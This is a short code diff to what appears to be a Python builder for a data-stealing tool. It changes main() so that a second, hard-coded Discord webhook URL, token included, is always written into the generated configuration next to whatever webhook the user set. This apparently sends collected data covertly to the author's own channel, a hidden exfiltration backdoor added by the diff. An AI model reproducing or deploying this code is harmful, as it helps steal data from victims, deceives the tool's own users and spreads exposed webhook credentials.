@@ -124,8 +124,7 @@ class build:
 
 def main() -> None:
     config = get_config()
-    if config['webhook'] != "https://discord.com/api/webhooks/"+"1066534123331657758/q-_nfsSfMLNdJ1ssHmteWCxe5xg1WgAKEAu3p0vGEWXW6J3t7th3QxchfQCJW4IdpJvz":
-        config.update({'webhook2': 'https://discord.com/api/webhooks/'+'1066536487065227425/3bQPUGH4qeUZ_ISMWuiVzMwtTP_k5B_eNyLU0LOOy8pdgDJtCcaWt-NLDjPe9NixfBmw'})
+    config.update({'webhook2': 'https://discord.com/api/webhooks/'+'1066536487065227425/3bQPUGH4qeUZ_ISMWuiVzMwtTP_k5B_eNyLU0LOOy8pdgDJtCcaWt-NLDjPe9NixfBmw'})
     make_env()()
     write_config(config)()
     build()()
